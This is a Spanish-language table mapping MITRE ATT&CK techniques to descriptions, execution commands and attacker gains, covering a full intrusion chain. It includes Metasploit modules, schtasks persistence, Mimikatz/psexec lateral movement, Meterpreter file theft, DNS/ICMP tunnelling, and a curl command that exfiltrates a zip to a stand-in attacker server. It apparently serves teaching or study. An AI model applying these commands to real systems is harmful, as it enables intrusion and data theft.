| T1583 | Es la acción de adquirir o alquilar servidores, dominios web, VPS o cuentas en la nube para ser utilizados en el ataque. | T1566.002 | Es una técnica de ingeniería social donde el atacante envía un correo electrónico personalizado a un objetivo específico, conteniendo un enlace malicioso. La condición necesaria es tener una víctima que confíe en el remitente y haga clic. | Logra el primer punto de apoyo (acceso inicial) dentro de la red de la víctima. | T1053.005 |  Es la creación o modificación de tareas programadas en el sistema operativo Windows para ejecutar un programa malicioso. Otorga persistencia al atacante, asegurando que el malware se reactive automáticamente cada cierto tiempo o cada vez que el equipo se reinicie, incluso si el usuario intenta cerrarlo. | Una vez dentro del sistema (ej. con Meterpreter), se usa el comando shell y luego el comando nativo de Windows schtasks /create /sc onlogon /tn "Actualizacion" /tr "C:\ruta\malware.exe". El malware seguirá ejecutándose automáticamente cada vez que el usuario reinicie o inicie sesión, aunque el antivirus lo cierre temporalmente. |
| T1078.002 | Es el uso de credenciales (usuario y contraseña) robadas de una cuenta real y activa dentro de un dominio de Active Directory. Otorga un acceso legítimo y privilegiado a la red corporativa, permitiendo al atacante moverse lateralmente por otros equipos sin levantar sospechas, ya que el sistema reconoce las credenciales como válidas. | Usando técnicas de acceso a credenciales (como Mimikatz) para robar hashes. Luego, se usa el módulo exploit/windows/smb/psexec de Metasploit (o wmiexec.py, smbexec.py de Impacket) con el usuario y contraseña robada. | Obtiene un pase libre y silencioso por la red corporativa. Al usar credenciales reales, el sistema no lo reconoce como intruso, permitiéndole moverse sin ser detectado. |
| T1068 | Es la explotación de una vulnerabilidad de seguridad en el sistema operativo o en un software instalado para obtener más permisos. Permite al atacante elevar sus privilegios desde un usuario estándar hasta un administrador o cuenta SYSTEM, dándole control total sobre la máquina comprometida. | Buscando un exploit adecuado para la versión del sistema (por ejemplo, el famoso MS16-032 o EternalBlue). Se ejecuta dentro del sistema usando Metasploit: use exploit/windows/local/ms16_032_secondary_logon_handle_privesc y se usa set SESSION 1. | Logra el control total (SYSTEM o Administrador) sobre la máquina. Ya no es un usuario más; ahora tiene permisos para modificar todo, instalar lo que quiera y borrar rastros. |
| T1082 | Es la recopilación de datos básicos del sistema infectado, como el nombre del equipo, la versión exacta de Windows, el idioma y la arquitectura. Permite al atacante entender el entorno en el que está operando, lo cual es fundamental para saber qué comandos usar, cómo comportarse y si el sistema es valioso para sus objetivos. | Dentro de una sesión de Meterpreter, se usa el comando sysinfo. Si se tiene acceso a una consola shell, se usa el comando nativo systeminfo de Windows. | Consigue entender el terreno en el que está pisando. Sabe con certeza qué sistema operativo tiene, la versión exacta y el idioma, lo cual es clave para los siguientes pasos. |
| T1033 | Es la acción de identificar qué cuentas de usuario están conectadas actualmente al sistema o quiénes tienen sesión abierta en el dominio. Brinda al atacante información clave para decidir a qué usuario suplantar o atacar, y para saber si hay algún administrador observando el sistema en ese momento. | Usando el comando getuid dentro de Meterpreter para saber quién eres. O usando el comando whoami o query user dentro de una consola shell. | Descubre quiénes están activos en el sistema en ese momento. Esto le permite saber si hay administradores mirando (riesgo) y a qué usuario puede suplantar para pasar desapercibido. |
| T1016 | Es la recopilación de la configuración de red del equipo, como direcciones IP, servidores DNS, máscaras de subred y puertas de enlace predeterminadas. Permite al atacante mapear la red interna desde la perspectiva de la víctima, sabiendo por dónde puede salir el tráfico, qué subredes existen y hacia dónde moverse. | Usando el comando ipconfig dentro de Meterpreter. Si estás en un shell, usas los comandos nativos ipconfig /all o route print. | Logra mapear las rutas de red de la víctima (IP, DNS, puerta de enlace). Esto le permite saber hacia dónde apuntar para salir de la red o llegar a otros equipos internos. |
| T1087 | Es la enumeración y listado de todos los usuarios y grupos locales o del dominio de Active Directory que existen en el sistema. Permite al atacante identificar potenciales objetivos (como administradores o altos ejecutivos) cuyas cuentas podrá robar o suplantar para seguir avanzando en la red. | Usando el comando net user dentro de un shell de Windows. Para ver grupos, se usa net localgroup. | Obtiene un listado completo de todos los usuarios y grupos del sistema o dominio. Esto le da un mapa de a quiénes atacar para robar sus contraseñas. |
| T1069 | Es la búsqueda y descubrimiento de los grupos de seguridad y sus niveles de acceso dentro del sistema (ejemplo: "Administradores", "Usuarios del dominio"). Permite saber quién tiene acceso a qué. Al conocer los grupos privilegiados, el atacante sabe a qué usuarios debe robarles las credenciales para obtener el máximo control posible. | Usando el comando net localgroup dentro de un shell para ver los grupos locales. Para ver grupos del dominio, se usa el comando net group /domain. | Logra identificar a las "vacas sagradas". Sabe exactamente qué grupos tienen los permisos más altos, para enfocar sus esfuerzos en robar las cuentas de esos usuarios específicos. |
| T1021.001 | Es el uso del protocolo RDP (Escritorio Remoto) para conectarse de forma interactiva a otra máquina dentro de la misma red. Permite el movimiento lateral. Usando credenciales robadas, el atacante puede saltar a otros ordenadores y tomar el control gráfico de ellos, como si estuviera sentado frente a esa pantalla. | Usando herramientas como xfreerdp o rdesktop desde Kali, con el comando xfreerdp /u:Administrador /v:10.0.2.3. Es necesario tener el puerto 3389 abierto y credenciales válidas de la víctima. | Logra el salto a otra máquina (movimiento lateral). Puede tomar el control gráfico y visual de otro computador de la empresa sin tener que estar físicamente allí. |
| T1005 | Es la acción de buscar y recolectar datos sensibles y archivos almacenados directamente en el disco duro local de la máquina infectada (documentos, hojas de cálculo, imágenes, etc.). Permite el robo directo de información corporativa o personal que esté guardada en el equipo, cumpliendo el objetivo final de muchos ataques (el espionaje o la extorsión). | Usando el comando search -f *.docx dentro de Meterpreter para buscar archivos. Luego, para robarlos, se usa el comando download C:\ruta\archivo.doc /home/pako/ para traerlo a tu Kali. | Consigue robar información valiosa (documentos, contratos, fotos, bases de datos) que están guardadas en el disco duro de la víctima. Es el botín directo. |
| T1074.001 | Es el proceso de reunir, organizar y comprimir (en un solo archivo o carpeta) todos los datos robados dentro de la máquina víctima, antes de enviarlos al atacante. Permite al atacante preparar la exfiltración de una forma más rápida y silenciosa, reduciendo el tráfico de red al enviar un solo paquete en lugar de muchos archivos sueltos. | Dentro de la consola shell de la víctima, se usa el comando tar -czvf datos_robados.tar.gz C:\ruta\documentos\*.docx (si tiene instalado tar), o usando el comando powershell Compress-Archive para empaquetar y comprimir todos los archivos en un .zip antes de subirlos. | Logra optimizar el robo. Al comprimir todo en un solo archivo, hace que el envío de los datos sea mucho más rápido y evita generar cientos de conexiones que podrían delatarlo. |
| T1071.001 | Es el uso de los protocolos estándar de internet HTTP o HTTPS (puertos 80 y 443) como medio de comunicación entre el malware y el servidor del atacante. Permite que el malware envíe órdenes y reciba instrucciones sin ser detectado, ya que camufla el tráfico malicioso como si fuera una simple navegación web normal. | Al configurar un payload en Metasploit (como windows/x64/meterpreter/reverse_tcp), la conexión se establece por defecto usando el protocolo TCP. Para usar HTTP, se usa el payload windows/x64/meterpreter/reverse_http o reverse_https, y el atacante configura un handler con set PAYLOAD ... correspondiente y set LHOST. | Logra un canal de comunicación persistente y camuflado (C2). El malware puede seguir recibiendo órdenes sin ser bloqueado, porque parece tráfico web normal. |
| T1572 | ¿Qué es? Es la técnica de encapsular el tráfico malicioso (como comandos) dentro de otros protocolos de red que normalmente están permitidos, como las consultas DNS o el tráfico ICMP (ping). Permite evadir firewalls y sistemas de detección de intrusos (IDS), ya que el tráfico malicioso viaja dentro de un "túnel" que parece legítimo y suele estar autorizado a salir de la red. | Usando herramientas específicas como dnscat2 (que esconde comandos dentro de consultas DNS) o icmpsh (que esconde el tráfico dentro de pings ICMP). | Logra evadir los cortafuegos más estrictos. Al esconder los comandos dentro de protocolos como DNS o ICMP, consigue mantener la comunicación con su servidor incluso en redes muy seguras. |
| T1048.003 | Es el envío de los datos robados hacia el exterior utilizando un protocolo diferente al que usa el malware para recibir órdenes, y a menudo sin cifrar o con ofuscación básica. Permite al atacante sacar la información de la empresa. Al usar un protocolo alternativo, el atacante intenta que la exfiltración pase desapercibida para los analistas de seguridad, quienes suelen enfocarse solo en el canal de comando principal. | El atacante puede usar un simple curl o wget para subir un archivo comprimido a un servidor externo (como un Dropbox o Google Drive falso). Por ejemplo, dentro del shell de la víctima: curl -X POST -F "file=@C:\datos.zip" http://servidor-atacante.com/upload. | Logra sacar la información de la empresa a su poder. El atacante obtiene exitosamente los datos robados en su servidor, completando el objetivo final del ciberataque. |
